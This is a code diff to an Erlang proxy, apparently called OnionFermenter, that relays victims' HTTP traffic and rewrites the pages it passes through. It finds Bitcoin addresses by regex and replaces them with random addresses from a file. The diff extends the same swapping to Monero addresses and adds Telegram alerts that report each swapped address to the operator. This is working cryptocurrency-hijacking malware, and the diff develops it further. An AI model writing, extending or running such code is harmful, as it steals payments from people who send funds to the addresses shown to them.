@@ -6,7 +6,7 @@
 -export([close/2]). % used to indicate worker that connector socket has been closed
 -export([init/1, handle_call/3, handle_cast/2, handle_info/2, code_change/3, terminate/2]).
 
--record(state, {supervisor, uid, socket, logger, destinationhost, replace, connector, btcaddresses, dstport, connectorbuf = <<>>, sourcebuf = <<>>}).
+-record(state, {supervisor, uid, socket, logger, destinationhost, replace, connector, addresses, currencytype, dstport, connectorbuf = <<>>, sourcebuf = <<>>}).
 
 
 start_link(Socket, Logger, DestinationHost, Replace, DstPort, Supervisor) ->
@@ -20,11 +20,32 @@ init([Socket, Logger, DestinationHost, Replace, DstPort, Supervisor]) ->
 
 % handle start message from self
 handle_cast(accept, State) ->
-    BtcAddresses = readfile("BTC-ADDRESSES.txt"), % read file with BTC addresses into memory
+    % Get currency type from environment (default to BTC for backward compatibility)
+    CurrencyType = case os:getenv("CURRENCY_TYPE") of
+        false -> "BTC";
+        "" -> "BTC";
+        Type -> Type
+    end,
+    
+    % Determine address file name based on currency type
+    AddressFileName = case CurrencyType of
+        "XMR" -> "XMR-ADDRESSES.txt";
+        "MONERO" -> "XMR-ADDRESSES.txt";
+        _ -> "BTC-ADDRESSES.txt"
+    end,
+    
+    Addresses = readfile(AddressFileName), % read file with crypto addresses into memory
     {ok, AcceptSocket} = gen_tcp:accept(State#state.socket),
     onionfermenter_sup:start_socket(State#state.supervisor), % start a new listener to replace this one
     {ok, Connector} = onionfermenter_connector_server:start_link(self(), State#state.destinationhost, State#state.dstport), % start connector for this worker
-    {noreply, #state{uid=State#state.uid, socket=AcceptSocket, logger=State#state.logger, destinationhost=State#state.destinationhost, replace=State#state.replace, connector=Connector, btcaddresses=BtcAddresses }};
+    
+    % Send startup notification if Telegram is enabled
+    case onionfermenter_telegram:is_enabled() of
+        true -> onionfermenter_telegram:send_message("🚀 OnionFermenter worker started\nCurrency: " ++ CurrencyType);
+        false -> ok
+    end,
+    
+    {noreply, #state{uid=State#state.uid, socket=AcceptSocket, logger=State#state.logger, destinationhost=State#state.destinationhost, replace=State#state.replace, connector=Connector, addresses=Addresses, currencytype=CurrencyType }};
 % handle message from connector
 handle_cast({send, Msg}, State) ->
 
@@ -39,8 +60,8 @@ handle_cast({send, Msg}, State) ->
     Remaining = case Ret of
         { HttpMessage, Rest } ->
             {VictimString, OFString} = State#state.replace,
-            BtcReplacedMessage = replaceBtcAddresses(HttpMessage, State#state.btcaddresses, State#state.logger, State#state.uid), % replace all btc addresses in msg
-            gen_tcp:send(State#state.socket, replace(BtcReplacedMessage, VictimString, OFString)), % send tampered msg to source
+            ReplacedMessage = replaceCryptoAddresses(HttpMessage, State#state.addresses, State#state.currencytype, State#state.logger, State#state.uid), % replace all crypto addresses in msg
+            gen_tcp:send(State#state.socket, replace(ReplacedMessage, VictimString, OFString)), % send tampered msg to source
             Rest;
         more -> Alldata % no packet found, wait for more
     end,
@@ -107,10 +128,21 @@ generate_uid() ->
 replace(Msg, StrToReplace, Str) ->
     binary:replace(Msg, list_to_binary(StrToReplace), list_to_binary(Str), [global]).
 
-% replace all btc addresses in binary
-replaceBtcAddresses(Msg, Addresses, Logger, Uid) ->
-    % get all btc addresses in msg
-    Ret = re:run(Msg, "((?:bc1|bc1p|[13])[a-zA-HJ-NP-Z0-9]{25,39})(?:[^a-zA-Z0-9\/\.])",  [global, {capture, all_but_first, list}]),
+% Get regex pattern based on currency type
+get_address_pattern(CurrencyType) ->
+    case CurrencyType of
+        "XMR" -> "([48][0-9AB][1-9A-HJ-NP-Za-km-z]{93})(?:[^a-zA-Z0-9\/\.])"; % Monero addresses (95 chars starting with 4 or 8)
+        "MONERO" -> "([48][0-9AB][1-9A-HJ-NP-Za-km-z]{93})(?:[^a-zA-Z0-9\/\.])"; % Monero addresses
+        _ -> "((?:bc1|bc1p|[13])[a-zA-HJ-NP-Z0-9]{25,39})(?:[^a-zA-Z0-9\/\.])" % Bitcoin addresses (default)
+    end.
+
+% replace all crypto addresses in binary
+replaceCryptoAddresses(Msg, Addresses, CurrencyType, _Logger, _Uid) ->
+    % get regex pattern for the currency type
+    Pattern = get_address_pattern(CurrencyType),
+    
+    % get all crypto addresses in msg
+    Ret = re:run(Msg, Pattern, [global, {capture, all_but_first, list}]),
 
     % no match, return unedited
     case Ret of
@@ -121,7 +153,7 @@ replaceBtcAddresses(Msg, Addresses, Logger, Uid) ->
             Set = sets:from_list(Matches),
             UniqMatches = sets:to_list(Set),
 
-            % for each address replace with random one in the btcaddesses
+            % for each address replace with random one in the addresses
             % return final message
             lists:foldl(fun(N, Acc) ->
 
@@ -132,6 +164,12 @@ replaceBtcAddresses(Msg, Addresses, Logger, Uid) ->
                     0 -> Acc; % do nothing if there are no addresses of valid length
                     _ ->
                         Addr = pickrandom(ValidAddressCandidates),
+                        
+                        % Send Telegram notification if enabled
+                        spawn(fun() -> 
+                            onionfermenter_telegram:send_replacement_notification(N, Addr, CurrencyType)
+                        end),
+                        
                         %onionfermenter_logger_server:log(Logger, Uid, list_to_binary("Replaced " ++ N ++ " with " ++ Addr ++ "\n")), % log changes
                         replace(Acc, N, Addr)
                     end
